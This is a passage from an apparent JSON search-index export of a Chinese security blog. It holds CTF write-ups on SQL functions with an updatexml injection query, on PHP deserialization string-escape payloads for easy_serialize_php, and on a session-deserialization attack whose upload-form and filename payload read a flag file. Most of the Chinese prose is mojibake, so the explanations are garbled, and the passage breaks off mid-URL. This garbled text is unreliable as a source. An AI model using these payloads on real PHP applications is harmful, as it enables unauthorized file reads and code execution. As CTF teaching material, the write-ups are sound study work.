ä¸ªå­—ç¬¦ è¿”å›å­—ç¬¦ä¸² runoob ä¸­çš„å‰ä¸¤ä¸ªå­—ç¬¦ï¼š SELECT LEFT(â€˜runoobâ€™,2) â€“ ru midmid()å‡½æ•°ä¸ºæˆªå–å­—ç¬¦ä¸²ä¸€éƒ¨åˆ†ã€‚mid(column_name,start,length) column_name å¿…éœ€ï¼Œè¦æå–å­—ç¬¦çš„å­—æ®µ start å¿…éœ€ï¼Œè§„å®šå¼€å§‹ä½ç½®ï¼ˆèµ·å§‹ä¸º1ï¼‰ length å¯é€‰ï¼Œè¦è¿”å›çš„å­—ç¬¦æ•°ï¼Œå¦‚æœçœç•¥åˆ™è¿”å›å‰©ä½™æ–‡æœ¬ egï¼šstr=â€œ123456â€ mid(str,2,1) ç»“æœä¸º2 substrsubstrï¼ˆï¼‰ Substr()å’Œsubstring()å‡½æ•°å®ç°çš„åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼Œå‡ä¸ºæˆªå–å­—ç¬¦ä¸²ã€‚ string substring(string, start, length) string substr(string, start, length) å‚æ•°æè¿°åŒmid()å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦å¤„ç†çš„å­—ç¬¦ä¸²ï¼Œstartä¸ºå¼€å§‹ä½ç½®ï¼Œlengthä¸ºæˆªå–çš„é•¿åº¦ ASCIIè¿”å›å­—ç¬¦ä¸² s çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII ç ã€‚è¿”å› CustomerName å­—æ®µç¬¬ä¸€ä¸ªå­—æ¯çš„ ASCII ç ï¼š SELECT ASCII(CustomerName) AS NumCodeOfFirstCharFROM Customers; countè¿”å›æŸ¥è¯¢çš„è®°å½•æ€»æ•°ï¼Œexpression å‚æ•°æ˜¯ä¸€ä¸ªå­—æ®µæˆ–è€… * å· è¿”å› Products è¡¨ä¸­ products å­—æ®µæ€»å…±æœ‰å¤šå°‘æ¡è®°å½•ï¼š SELECT COUNT(ProductID) AS NumberOfProducts FROM Products; ifIF(expr,v1,v2) å¦‚æœè¡¨è¾¾å¼ expr æˆç«‹ï¼Œè¿”å›ç»“æœ v1ï¼›å¦åˆ™ï¼Œè¿”å›ç»“æœ v2SELECT IF(1 &gt; 0,â€˜æ­£ç¡®â€™,â€˜é”™è¯¯â€™)-&gt;æ­£ç¡® updatexmlupdatexml()å‡½æ•°ï¼Œæ˜¯æ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°ã€‚ è¯­æ³•updatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹) select username from security.user where id=1 and (updatexml(â€˜anythingâ€™,â€™/xx/xxâ€™,â€™anythingâ€™))","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://pp1ove.gitee.io/tags/sql/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸","slug":"ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸","date":"2021-01-17T03:19:58.000Z","updated":"2021-02-22T15:17:22.325Z","comments":false,"path":"2021/01/17/ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/17/ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸/","excerpt":"","text":"PHPååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸ä»»ä½•å…·æœ‰ä¸€å®šç»“æ„çš„æ•°æ®ï¼Œåªè¦ç»è¿‡äº†æŸäº›å¤„ç†è€ŒæŠŠè‡ªèº«ç»“æ„æ”¹å˜ï¼Œåˆ™å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ã€‚ è‹¥æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²å…ˆè¢«åºåˆ—åŒ–,ç„¶ååˆç»è¿‡è¿‡æ»¤å‡½æ•°,é‚£ä¹ˆå®ƒçš„ç»“æ„å°†ä¼šå‘ç”Ÿæ”¹å˜,å¯èƒ½å°±ä¼šäº§ç”Ÿæ¼æ´ è¿™é‡Œåˆ©ç”¨[å®‰æ´µæ¯ 2019]easy_serialize_phpæ¥è¿›è¡Œè®²è§£ è¿‡æ»¤å‡½æ•°å¼•å‘çš„ç»“æ„å˜åŒ–ç¬¬ä¸€ç§ä¸ºå…³é”®è¯æ•°å¢åŠ  ä¾‹å¦‚ï¼š where-&gt;hackerï¼Œè¿™æ ·è¯æ•°ç”±äº”ä¸ªå¢åŠ åˆ°6ä¸ªã€‚é¢˜ç›®: 0CTF 2016 piapiapiaç¬¬äºŒç§ä¸ºå…³é”®è¯æ•°å‡å°‘ä¾‹å¦‚ï¼šç›´æ¥è¿‡æ»¤æ‰ä¸€äº›å…³é”®è¯ é”®é€ƒé€¸å’Œå€¼é€ƒé€¸å€¼é€ƒé€¸ï¼šè¿™å„¿éœ€è¦ä¸¤ä¸ªè¿ç»­çš„é”®å€¼å¯¹ï¼Œç”±ç¬¬ä¸€ä¸ªçš„å€¼è¦†ç›–ç¬¬äºŒä¸ªçš„é”®ï¼Œè¿™æ ·ç¬¬äºŒä¸ªå€¼å°±é€ƒé€¸å‡ºå»ï¼Œå•ç‹¬ä½œä¸ºä¸€ä¸ªé”®å€¼å¯¹ _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&amp;function=show_image var_dumpçš„ç»“æœä¸ºï¼š &quot;a:3{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;}&quot; é”®é€ƒé€¸ï¼š è¿™å„¿åªéœ€è¦ä¸€ä¸ªé”®å€¼å¯¹å°±è¡Œäº†ï¼Œæˆ‘ä»¬ç›´æ¥æ„é€ ä¼šè¢«è¿‡æ»¤çš„é”®ï¼Œè¿™æ ·å€¼å¾—ä¸€éƒ¨åˆ†å……å½“é”®ï¼Œå‰©ä¸‹å¾—ä¸€éƒ¨åˆ†ä½œä¸ºå•ç‹¬å¾—é”®å€¼å¯¹ _SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;} var_dumpçš„ç»“æœä¸ºï¼š &quot;a:2:{s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc=&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;}&quot; è¿™å„¿å¾—s:7:â€â€ä¹‹æ‰€ä»¥ä¸ºç©ºï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æ„é€ å¾—é”®flagphpéƒ½æ˜¯ä¼šè¢«è¿‡æ»¤å¾—ï¼Œæ‰€ä»¥æ˜¾ç¤ºä¸ºç©ºï¼Œè¿™æ ·å°±èƒ½åƒæ‰ä¸€éƒ¨åˆ†å€¼äº†ï¼Œç„¶åå°†å‰©ä¸‹å¾—å€¼å……å½“å¦ä¸€ä¸ªå¯¹è±¡é€ƒé€¸å‡ºå» [å®‰æ´µæ¯ 2019]easy_serialize_phpé¦–å…ˆè¿›å»å°±å¯ä»¥çœ‹åˆ°æºç  &lt;?php $function = @$_GET[&#39;f&#39;]; function filter($img){ $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;; return preg_replace($filter,&#39;&#39;,$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[&quot;user&quot;] = &#39;guest&#39;; $_SESSION[&#39;function&#39;] = $function; extract($_POST); //extractå˜é‡è¦†ç›– if(!$function){ echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;; } if(!$_GET[&#39;img_path&#39;]){ $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;); }else{ $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;])); //sha1åŠ å¯† } $serialize_info = filter(serialize($_SESSION)); if($function == &#39;highlight_file&#39;){ highlight_file(&#39;index.php&#39;); }else if($function == &#39;phpinfo&#39;){ eval(&#39;phpinfo();&#39;); //maybe you can find something in here! }else if($function == &#39;show_image&#39;){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;])); } çŸ¥è¯†ç‚¹ extractå˜é‡è¦†ç›– ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ è§£é¢˜é¦–å…ˆæŸ¥çœ‹phpinfoå‘ç°php.iniä¸­è®¾ç½®äº†auto_prepend_fileéšå¼åŒ…å«äº†d0g3_f1ag.php,æœ¬é¢˜å°±æ˜¯è¦è¯»å–è¯¥æ–‡ä»¶ 0x01 extractå˜é‡è¦†ç›–extract()å‡½æ•° è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„çš„é”®å€¼ä½œä¸ºå˜é‡å€¼ å…¶å®æœ¬æ˜¯çŸ¥é“è¿™ä¸ªçŸ¥è¯†ç‚¹çš„,ä½†æ˜¯ç†è§£ä¸å¤Ÿæ·±å…¥,å¯¼è‡´è‡ªå·±ä¸€ç›´æ²¡æœ‰åˆ©ç”¨åˆ°è¯¥çŸ¥è¯†ç‚¹ å½“æˆ‘ä»¬$_GETä¼ å…¥çš„æ˜¯_session[img]=â€œindex.phpâ€æ—¶,ç»è¿‡äº†extractå‡½æ•°åä¼šäº§ç”Ÿ$_session[img]=index.php è¿™é‡Œåˆ†æä»£ç  å…ˆæ˜¯èµ‹å€¼: $_SESSION[â€œuserâ€] = â€˜guestâ€™;$_SESSION[â€˜functionâ€™] = $function; //è‹¥æƒ³è¦æ˜¾ç¤ºæºç ,$f=â€™show_imageâ€™; $_SESSION[â€˜imgâ€™]ä¹Ÿåªèƒ½ç­‰äºbase64_encode(â€˜guest_img.pngâ€™);å› ä¸ºè‹¥æˆ‘ä»¬ä¼ å…¥å‚æ•°img_PATHçš„è¯imgçš„å€¼ä¼šè¿›è¡Œsha1åŠ å¯†,è€Œåé¢æ˜¯æ²¡æœ‰è§£å¯†çš„ å¯çŸ¥ä¸‰ä¸ªå˜é‡éƒ½æ˜¯æˆ‘ä»¬ä¸èƒ½æ§åˆ¶çš„,è¿™é‡Œå°±èƒ½å¤Ÿæœ‰å¾ˆå¤šç§è§£äº†,é€šè¿‡extract()è¿›è¡Œå˜é‡è¦†ç›– 0x02 ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸_sessionå¯æ§å,å°±å¯ä»¥æœ‰å¾ˆå¤šç§è§£æ³•äº†,è¿™é‡Œæä¾›ä¸¤ç§è§£æ³•: å€¼é€ƒé€¸payload1:_SESSION[user]=flagflagflagflagflagflagflagphp&amp;_SESSION[function]=function&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}ä¼ å…¥çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–å: a:3;{s:4:&quot;user&quot;;s:31:&quot;flagflagflagflagflagflagflagphp&quot;; s:8:&quot;function&quot;;s:82:&quot;function&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;; s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} ç»è¿‡è¿‡æ»¤å‡½æ•°å: a:3;{s:4:&quot;user&quot;;s:31:&quot;&quot;;s:8:&quot;function&quot;;s:82:&quot;function&quot;; s:8:&quot;function&quot;;s:10:&quot;show_image&quot;; s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;} //;&quot;s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} é”®é€ƒé€¸payload2:_SESSION[flagphp]=;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;} ä¼ å…¥çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–å: a:2:{s:7:&quot;flagphp&quot;; s:48:&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;; s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} ç»è¿‡è¿‡æ»¤å‡½æ•°å: a:2:{s:7:&quot;&quot;;s:48:&quot;; s:1:&quot;a&quot;; s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot; //;&quot;s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} è¿˜æœ‰å°±æ˜¯å†™payloadæœ€å¥½åœ¨æœ¬åœ°å†™,ç„¶åçœ‹å®ƒååºåˆ—åŒ–åçš„æ ·å­åœ¨æ›´æ”¹,ä¸ç„¶æœ‰äº›å°æ¯›ç—…è‡ªå·±å‘ç°ä¸äº†(ç°åœ¨èƒ½åŠ›å¤ªå·®äº†) ç„¶åç»§ç»­è¯»å°±å¯ä»¥äº†","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://pp1ove.gitee.io/tags/ååºåˆ—åŒ–/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"sessionååºåˆ—åŒ–","slug":"sessionååºåˆ—åŒ–","date":"2021-01-16T05:08:54.000Z","updated":"2021-01-17T11:54:05.766Z","comments":false,"path":"2021/01/16/sessionååºåˆ—åŒ–/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/16/sessionååºåˆ—åŒ–/","excerpt":"","text":"Sessionååºåˆ—åŒ–å…ˆæ¥äº†è§£ä¸€ä¸‹å…³äºsessionçš„ä¸€äº›åŸºç¡€çŸ¥è¯†ä»€ä¹ˆæ˜¯session?åœ¨è®¡ç®—æœºä¸­ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€ã€‚Session å¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå½“ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºçš„ Web é¡µä¹‹é—´è·³è½¬æ—¶ï¼Œå­˜å‚¨åœ¨ Session å¯¹è±¡ä¸­çš„å˜é‡å°†ä¸ä¼šä¸¢å¤±ï¼Œè€Œæ˜¯åœ¨æ•´ä¸ªç”¨æˆ·ä¼šè¯ä¸­ä¸€ç›´å­˜åœ¨ä¸‹å»ã€‚å½“ç”¨æˆ·è¯·æ±‚æ¥è‡ªåº”ç”¨ç¨‹åºçš„ Web é¡µæ—¶ï¼Œå¦‚æœè¯¥ç”¨æˆ·è¿˜æ²¡æœ‰ä¼šè¯ï¼Œåˆ™ Web æœåŠ¡å™¨å°†è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª Session å¯¹è±¡ã€‚å½“ä¼šè¯è¿‡æœŸæˆ–è¢«æ”¾å¼ƒåï¼ŒæœåŠ¡å™¨å°†ç»ˆæ­¢è¯¥ä¼šè¯ã€‚ sessionæ˜¯å¦‚ä½•èµ·ä½œç”¨çš„å½“ç¬¬ä¸€æ¬¡è®¿é—®ç½‘ç«™æ—¶ï¼ŒSeesion_start()å‡½æ•°å°±ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„Session IDï¼Œå¹¶è‡ªåŠ¨é€šè¿‡HTTPçš„å“åº”å¤´ï¼Œå°†è¿™ä¸ªSession IDä¿å­˜åˆ°å®¢æˆ·ç«¯Cookieä¸­ã€‚åŒæ—¶ï¼Œä¹Ÿåœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªä»¥Session IDå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºä¿å­˜è¿™ä¸ªç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚å½“åŒä¸€ä¸ªç”¨æˆ·å†æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™æ—¶ï¼Œä¹Ÿä¼šè‡ªåŠ¨é€šè¿‡HTTPçš„è¯·æ±‚å¤´å°†Cookieä¸­ä¿å­˜çš„Seesion IDå†æºå¸¦è¿‡æ¥ï¼Œè¿™æ—¶Session_start()å‡½æ•°å°±ä¸ä¼šå†å»åˆ†é…ä¸€ä¸ªæ–°çš„Session IDï¼Œè€Œæ˜¯åœ¨æœåŠ¡å™¨çš„ç¡¬ç›˜ä¸­å»å¯»æ‰¾å’Œè¿™ä¸ªSession IDåŒåçš„Sessionæ–‡ä»¶ï¼Œå°†è¿™ä¹‹å‰ä¸ºè¿™ä¸ªç”¨æˆ·ä¿å­˜çš„ä¼šè¯ä¿¡æ¯è¯»å‡ºï¼Œåœ¨å½“å‰è„šæœ¬ä¸­åº”ç”¨ï¼Œè¾¾åˆ°è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·çš„ç›®çš„ã€‚ session_start()è¿™ä¸ªå‡½æ•°å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡ session_start() æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œ PHP å†…éƒ¨ä¼šä¾æ®å®¢æˆ·ç«¯ä¼ æ¥çš„PHPSESSIDæ¥è·å–ç°æœ‰çš„å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼ˆå³sessionæ–‡ä»¶ï¼‰ï¼Œ PHP ä¼šè‡ªåŠ¨ååºåˆ—åŒ–sessionæ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å°†ä¹‹å¡«å……åˆ° $_SESSION è¶…çº§å…¨å±€å˜é‡ä¸­ã€‚å¦‚æœä¸å­˜åœ¨å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼Œåˆ™åˆ›å»ºåä¸ºsess_PHPSESSID(å®¢æˆ·ç«¯ä¼ æ¥çš„)çš„æ–‡ä»¶ã€‚å¦‚æœå®¢æˆ·ç«¯æœªå‘é€PHPSESSIDï¼Œåˆ™åˆ›å»ºä¸€ä¸ªç”±32ä¸ªå­—æ¯ç»„æˆçš„PHPSESSIDï¼Œå¹¶è¿”å›set-cookieã€‚ php.iniä¸­ä¸€äº›Sessioné…ç½®session çš„å­˜å‚¨æœºåˆ¶phpä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ Directive å«ä¹‰ session.save_handler sessionä¿å­˜å½¢å¼ã€‚é»˜è®¤ä¸ºfiles session.save_path sessionä¿å­˜è·¯å¾„ã€‚ session.serialize_handler sessionåºåˆ—åŒ–å­˜å‚¨æ‰€ç”¨å¤„ç†å™¨ã€‚é»˜è®¤ä¸ºphpã€‚ session.upload_progress.cleanup ä¸€æ—¦è¯»å–äº†æ‰€æœ‰POSTæ•°æ®ï¼Œç«‹å³æ¸…é™¤è¿›åº¦ä¿¡æ¯ã€‚é»˜è®¤å¼€å¯ //è‹¥æ¼æ´å­˜åœ¨,æ­¤é¡¹åº”è¯¥ä¸ºoff session.upload_progress.enabled å°†ä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦ä¿¡æ¯å­˜åœ¨sessionä¸­ã€‚é»˜è®¤å¼€å¯ã€‚ sessionå‚¨å­˜å¤„ç†å™¨ï¼š php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼ php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ è¿™é‡Œå°±ä¸ä¸¾ä¾‹äº†,ç½‘ä¸Šæœ‰å¾ˆå¤šä¾‹å­ åˆ©ç”¨æ¡ä»¶ session.serialize_handler å¤„ç†å™¨ä¸ç›¸åŒ session.upload_progress.cleanup off session.upload_progress.enabled on å…³äºsession.upload_progress.enabledï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªphpçš„bug, https://bugs.php.net/bug.php?id=71101 éœ€è¦å…ˆä¸Šä¼ æ–‡ä»¶ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸session.upload_process.nameçš„åŒåå˜é‡ã€‚åç«¯ä¼šè‡ªåŠ¨å°†POSTçš„è¿™ä¸ªåŒåå˜é‡ä½œä¸ºé”®è¿›è¡Œåºåˆ—åŒ–ç„¶åå­˜å‚¨åˆ°sessionæ–‡ä»¶ä¸­ã€‚ä¸‹æ¬¡è¯·æ±‚å°±ä¼šååºåˆ—åŒ–sessionæ–‡ä»¶ï¼Œä»ä¸­å–å‡ºè¿™ä¸ªé”®ã€‚ å…·ä½“ä½œç”¨å¯ä»¥å»çœ‹å®˜æ–¹æ–‡æ¡£,å®˜æ–¹æ–‡æ¡£å†™å¾—æŒºè¯¦ç»†çš„,è¿™é‡Œå°±ä¸è¯¦ç»†çš„è®²äº†https://www.php.net/manual/zh/session.upload-progress.php è¿™é‡Œéœ€è¦åœ¨æœ¬åœ°å†™ä¸€æ®µpostè¡¨å•æ¥ä¸Šä¼ è‡³æœåŠ¡å™¨ //æœ‰äº†è¿™ä¸ªæ¼æ´ä¹‹åæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶sessionçš„å€¼ &lt;form action=&quot;URL&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; ç„¶å,åœ¨sessioné‡Œé¢å°±ä¼šäº§ç”Ÿè¿™æ ·çš„æ•°æ®: è¿™é‡Œçš„foo.aviåˆ™æ˜¯ä¸Šä¼ çš„æ–‡ä»¶åå­—,å¯ä»¥è¢«æˆ‘ä»¬æ‰€æ§åˆ¶,è®¾ç½®ä¸ºpayload,ç„¶åå°±éœ€è¦åˆ©ç”¨æ‰€è¯´çš„session.serialize_handler å¤„ç†å™¨çš„å·®å¼‚é—®é¢˜,è‹¥æˆ‘ä»¬å°†è¿™é‡Œçš„foo.aviæ”¹æˆä¸€ä¸ªååºåˆ—åŒ–å­—ç¬¦ä¸²,å†åœ¨å‰é¢åŠ ä¸Š|,è¿™é‡Œå¯ä»¥ç±»ä¼¼äºåŒå¼•å·é€ƒé€¸ è¿™é‡Œä¸ºæœ¬åœ°æµ‹è¯•çš„ç»“æœ: è¿™é‡Œå‡è®¾æˆ‘ä»¬çš„payloadä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œ åŸæœ¬æˆ‘ä»¬çš„payloadæ˜¯è¢«åŒå¼•å·ç»™åŒ…è£¹èµ·æ¥çš„,å¯¼è‡´æˆ‘ä»¬çš„payloadæ— æ³•è¿›è¡Œåºåˆ—åŒ–,ä½†æ˜¯å½“æˆ‘ä»¬çš„payloadå‰é¢åŠ äº†|ï¼Œå­—ç¬¦ä¸²xxxâ€œ|payloadâ€,ç¬¬ä¸€ä¸ªåŒå¼•å·è¢«å½“ä½œäº†é”®å€¼,è€Œ|åé¢çš„å­—ç¬¦ä¸²ä¹Ÿä¼šè¿›è¡Œååºåˆ—åŒ–,å¯¼è‡´æˆ‘ä»¬çš„payloadæˆåŠŸæ‰§è¡Œ,å¯ä»¥æ ¹æ®ä¸‹é¢çš„å›¾ç‰‡æ¥ç†è§£ è‹¥sessionæ–‡ä»¶ä»¥php_serialize+| å­˜å‚¨,phpæ–¹å¼è¯»å– è‹¥sessionä»¥phpå­˜å‚¨å’Œè¯»å–ï¼š //è¿™é‡Œè‹¥æŠŠs:71å‰é¢çš„|ç§»åŠ¨åˆ°O:5å‰é¢ä¹Ÿå¯è¾¾åˆ°åŒæ ·çš„æ•ˆæœ(è¿™æ ·è¯´å¯èƒ½æ–¹ä¾¿ä¸€ä¸‹ç†è§£) æ¥ä¸‹æ¥å°±å¼€å§‹å®æˆ˜å§ CTFä¾‹é¢˜ï¼šphpinfo()é¢˜ç›®åœ°å€: http://web.jarvisoj.com:32784/ é¦–å…ˆçœ‹ä¸‹phpinfo; è¿™é‡Œæœ‰å¾ˆå¤šé…ç½®,å…¶ä¸­æœ€æœ‰ç”¨çš„æ˜¯è¿™å‡ ä¸ªç”»çº¢çº¿çš„é…ç½® session.auto.startæ˜¯åœ¨è®¿é—®æ—¶ç”Ÿæˆå­˜å‚¨sessionæ–‡ä»¶çš„,å’Œsession_start()ä½œç”¨ç›¸åŒ,å› ä¸ºè¿™é¢˜æœ‰session_start()ï¼Œæ‰€ä»¥è¯´è¿™é¢˜ä¸ºoffä¹ŸåŒæ ·äº§ç”Ÿäº†æ¼æ´ï¼Œå½“ç„¶session.use_strict_modeé»˜è®¤å€¼ä¸º0æ—¶ä¹Ÿå¯è‡ªå·±è®¾ç½®session ID session.serialize_handleråé¢çš„sessionå¤„ç†å™¨å‡ºç°äº†å·®å¼‚ session.upload_progress.cleanupè‹¥ä¸ºon,åˆ™ä¼šè‡ªåŠ¨æ¸…é™¤sessionæ–‡ä»¶,æ‰€ä»¥åº”ä¸ºOffï¼ˆè‹¥ä¸ºOnæ—¶,å¯ä»¥é‡‡ç”¨æ¡ä»¶ç«äº‰) session.upload_progress.enabled phpçš„bug ä¿®æ”¹sessionæ–‡ä»¶è¿™é‡Œç¼–å†™è¡¨å•: &lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; å°†å…¶æ’å…¥åˆ°htmlä»£ç ä¸­ éšä¾¿é€‰æ‹©æ–‡ä»¶ä½¿ç”¨burpæŠ“åŒ… ä¿®æ”¹filenameçš„å€¼ä¸ºpayload //æ³¨æ„æ­¤å¤„çš„åŒå¼•å·è¦è½¬ä¹‰,å› ä¸ºæˆ‘ä»¬è¦å°†å…¶å­˜å‚¨åˆ°æ–‡ä»¶ä¸­,è¿™é‡Œå¯ä»¥çœ‹è§payloadå·²ç»æ‰§è¡ŒæˆåŠŸ è¯»å–æ–‡ä»¶å†…å®¹ï¼š é€šè¿‡file_get_contentsè¯»å–æ–‡ä»¶å†…å®¹ è®¾ç½®$mdzz=â€˜O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:87:&quot;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;))&quot;;} åºåˆ—è¯ç»“æœ O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&quot;;} æ–‡ä»¶åè®¾ç½®ä¸º |O:5:\\&quot;OowoO\\&quot;:1:{s:4:\\&quot;mdzz\\&quot;;s:88:\\&quot;print_r(file_get_contents(\\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\&quot;));\\&quot;;}ã€‚ ç›¸å…³æ–‡ç« :https://news.ssssafe.com/archives/1493","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://pp1ove.gitee.io/tags/ååºåˆ—åŒ–/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"ååºåˆ—åŒ–æ€»ç»“(æŒç»­æ›´æ–°)","slug":"ååºåˆ—åŒ–","date":"2021-01-15T03:04:22.000Z","updated":"2021-01-17T11:54:00.799Z","comments":false,"path":"2021/01/15/ååºåˆ—åŒ–/","link":"","permalink":"https://pp1ove.g